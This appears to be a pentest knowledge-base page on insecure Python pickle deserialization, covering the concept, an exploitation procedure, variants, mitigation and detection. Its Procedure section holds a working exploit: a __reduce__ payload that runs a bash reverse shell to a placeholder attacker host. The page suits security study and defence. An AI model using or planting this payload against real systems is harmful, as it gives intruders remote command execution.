---
topic: Python — insecure pickle deserialization
tags: [web, python, pickle, deserialization, rce]
---

# Python — insecure pickle deserialization

[🇪🇸 Español](python-pickle-deserialization.md) | **English**

## Concept

`pickle` and `cPickle` rebuild arbitrary objects. If the user controls the input, a class's `__reduce__` can return a function and its arguments, which run during `loads`. It is not a data format: it is an execution mechanism.

## When it applies

- The application stores serialized objects on disk, in cache or in a database.
- An endpoint accepts a file or field later passed to `pickle.loads`.
- The code uses `cPickle` on Python 2 or `pickle` without `RestrictedUnpickler`.

## Procedure

1. Find the `loads` call and confirm the data is controllable.
2. Create a class whose `__reduce__` returns `os.system` and the command.
3. Serialize with `pickle.dumps` and deliver the stream to the endpoint.
4. Use a reverse shell or write a key.

```python
import cPickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'",))
open("payload.p", "wb").write(cPickle.dumps(Exploit()))
```

```python
import pickle
pickle.load(open("payload.p", "rb"))
```

## Variants

- `builtins.eval` to run an expression.
- `subprocess.check_output` to capture output.
- `os.execv` to replace the process and avoid child processes.

## Limitations

- The endpoint must accept bytes and call `loads`.
- A `RestrictedUnpickler` with an allowlist blocks foreign classes.
- Execution runs as the web service user.

## Mitigation

- Do not use pickle for untrusted data; prefer JSON.
- Sign blobs and verify the signature before deserializing.
- Run the service as an unprivileged user without secrets.

## Detection

- Files with the `\x80\x02` or `c__builtin__` header in uploads.
- `pickle.loads` calls from public endpoints.
- Unexpected child processes of the web service.

## References

- [Python — pickle documentation](https://docs.python.org/3/library/pickle.html)
- [0xdf — Canape](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
